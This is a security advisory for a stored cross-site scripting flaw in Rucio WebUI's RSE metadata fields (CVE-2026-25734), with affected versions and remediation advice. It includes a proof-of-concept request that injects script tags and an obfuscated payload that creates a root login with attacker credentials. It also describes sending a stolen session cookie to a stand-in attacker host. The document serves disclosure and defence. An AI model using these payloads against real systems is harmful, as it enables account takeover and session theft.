# [M]  Rucio WebUI has Stored Cross-site Scripting (XSS) in RSE Metadata

## Summary
Severity: Medium
Advisory: GHSA-h9fp-p2p9-873q
CVE: CVE-2026-25734
CWE: CWE-1004, CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-02-25
Source: https://github.com/advisories/GHSA-h9fp-p2p9-873q
Type: github-advisory

## Affected
- PyPI: `rucio-webui` — affected >=0 <35.8.3
- PyPI: `rucio-webui` — affected >=36.0.0rc1 <38.5.4
- PyPI: `rucio-webui` — affected >=39.0.0rc1 <39.3.1

## Details
### Summary
A stored Cross-site Scripting (XSS) vulnerability was identified in the RSE metadata of the WebUI where attacker-controlled input is persisted by the backend and later rendered in the WebUI without proper output encoding. This allows arbitrary JavaScript execution in the context of the WebUI for users who view affected pages, potentially enabling session token theft or unauthorized actions.

---
### Details
Several metadata fields accept arbitrary input which is stored and later rendered unsafely in the WebUI when the RSEs are listed in the RSE Management dashboard.

**Create Path**:  
Admin > RSE Management

**Trigger Paths**:  
Admin > RSE Management  
Admin > RSE Management > _RSE NAME_

**Vulnerable Attributes**:  
City, Country_Name, ISP

**Request**
```http
POST /proxy/rses/XSSTEST HTTP/1.1
...
{"city":"<script>alert('CITY XSS')</script>","country_name":"<script>alert('COUNTRY XSS')</script>","ISP":"<script>alert('ISP XSS')</script>","deterministic":false,"volatile":false,"staging_area":false}
```

**Response**
```http
HTTP/1.1 201 CREATED
...
Created
```

**Stored XSS payload triggering in RSE listing after adding XSS payload in metadata**
<img width="1252" height="624" alt="Stored XSS payload triggering in RSE listing after adding XSS payload in metadata" src="https://github.com/user-attachments/assets/6546fc95-0c81-4db7-9271-37b5d4bc8f47" />

---
### Impact
Any authenticated user who views affected resources may execute attacker-controlled JavaScript in the WebUI origin. Depending on the affected feature, this may impact all users or administrative users only.

The impact is amplified by:
- Session cookies that are accessible to JavaScript (missing HttpOnly flag).
- API tokens exposed to the WebUI via JavaScript variables.

An attacker would likely attempt to exfiltrate the session token to an external site by setting an encoded version of the cookie as the path of a GET request to an attacker controlled site (i.e `GET https://attacker.example.com/rucio/{BASE64_COOKIE}`).

Attackers can also perform actions as the victim like creating a new UserPass identity with an attacker known password, creating/deleting an RSE, or exfiltrating data.

**XSS Payload to Create Root UserPass**
```html
<img src=x onerror=(function(){o={};o.method='PUT';o.credentials='include';o.headers={'X-Rucio-Username':'attackeruser','X-Rucio-Password':'AttackerPassword123','X-Rucio-Email':'demo@example.org','X-Rucio-Auth-Token':token};fetch(String.fromCharCode(47)+'identities'+String.fromCharCode(47)+'root'+String.fromCharCode(47)+'userpass',o)})()>
```

---
### Remediation / Mitigation
All client-side renderings of server-provided or user-controlled data must ensure proper HTML escaping before insertion into the DOM. Unsafe methods such as `.html()` should be avoided unless the content is explicitly sanitized. Safer alternatives include `.text()`, creating text nodes, or using a templating system that enforces automatic escaping.

Additional defense-in-depth measures include:
- Enforcing a strict Content Security Policy (CSP).
- Setting the HttpOnly flag on session cookies.
- Avoiding exposure of API tokens in JavaScript-accessible variables.

> Note that many pages were found setting the API token as `token` in an authenticated response like `var token = "root-root-webui-...:"` (See `/ui/list_accounts` for example)

---
### Resources
- OWASP XSS Prevention Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

## References
- https://github.com/rucio/rucio/security/advisories/GHSA-h9fp-p2p9-873q
- https://nvd.nist.gov/vuln/detail/CVE-2026-25734
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- https://github.com/rucio/rucio
- https://github.com/rucio/rucio/releases/tag/35.8.3
- https://github.com/rucio/rucio/releases/tag/38.5.4
- https://github.com/rucio/rucio/releases/tag/39.3.1
